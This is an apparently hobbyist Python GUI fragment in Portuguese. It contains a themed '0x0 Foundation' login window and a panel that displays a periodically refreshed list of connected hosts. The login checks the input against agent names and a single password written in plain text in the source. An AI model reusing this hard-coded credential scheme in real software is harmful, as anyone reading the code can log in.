        self.info_text.insert(tk.END, '\n'.join(info))
    
    def refresh_connections(self):
        self.conn_text.delete(1.0, tk.END)
        self.conn_text.insert(tk.END, "═" * 60 + "\n")
        self.conn_text.insert(tk.END, "0x0 - CONEXÕES ATIVAS\n")
        self.conn_text.insert(tk.END, "═" * 60 + "\n\n")
        
        for conn in active_connections:
            self.conn_text.insert(tk.END, f"IP: {conn.get('ip', 'N/A')}\n")
            self.conn_text.insert(tk.END, f"Host: {conn.get('hostname', 'N/A')}\n")
            self.conn_text.insert(tk.END, f"User: {conn.get('user', 'N/A')}\n")
            self.conn_text.insert(tk.END, f"Time: {conn.get('timestamp', 'N/A')}\n")
            self.conn_text.insert(tk.END, f"Status: {conn.get('status', 'N/A')}\n")
            self.conn_text.insert(tk.END, "-" * 40 + "\n")
        
        if not active_connections:
            self.conn_text.insert(tk.END, "Nenhuma conexão ativa no momento\n")
    
    def auto_update_connections(self):
        while True:
            time.sleep(5)
            self.after(0, self.refresh_connections)

# ============================================================
# TELA DE LOGIN
# ============================================================

# Limpar conexões anteriores ao iniciar
active_connections.clear()

class LoginApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("0x0 LOGIN - FOUNDATION")
        self.geometry("400x600")
        self.resizable(False, False)

        ctk.set_appearance_mode("dark")

        self.allowed_agents = [
            "agente-666", "agente-alpha", "agente-romeu", 
            "agente-bravo", "C.O", "liderança", 
            "cupula", "o conselho", "os três"
        ]
        self.correct_password = "0x0"

        image_path = os.path.join(os.path.dirname(__file__), "login_clean.png")
        if os.path.exists(image_path):
            self.bg_image = ctk.CTkImage(
                light_image=Image.open(image_path),
                dark_image=Image.open(image_path),
                size=(400, 600)
            )
            self.bg_label = ctk.CTkLabel(self, image=self.bg_image, text="")
            self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)

        self.entry_nome = ctk.CTkEntry(
            self, width=280, height=35, fg_color="transparent", 
            border_width=0, text_color="white", font=("Arial", 14)
        )
        self.entry_nome.place(x=60, y=280)

        self.entry_senha = ctk.CTkEntry(
            self, width=280, height=35, fg_color="transparent", 
            border_width=0, text_color="white", font=("Arial", 14), show="*"
        )
        self.entry_senha.place(x=60, y=346)

        self.login_button = ctk.CTkButton(
            self, text="LOGIN", width=280, height=40,
            fg_color="#a8f0c0", text_color="black",
            hover_color="#8edba6", command=self.login_event,
            corner_radius=5
        )
        self.login_button.place(x=60, y=450)

    def login_event(self):
        agent = self.entry_nome.get()
        pwd = self.entry_senha.get()

        if agent in self.allowed_agents and pwd == self.correct_password:
            self.withdraw()
            MainPanel()
        else:
            self.withdraw()
            AlertWindow()

if __name__ == "__main__":
    app = LoginApp()
    app.mainloop()
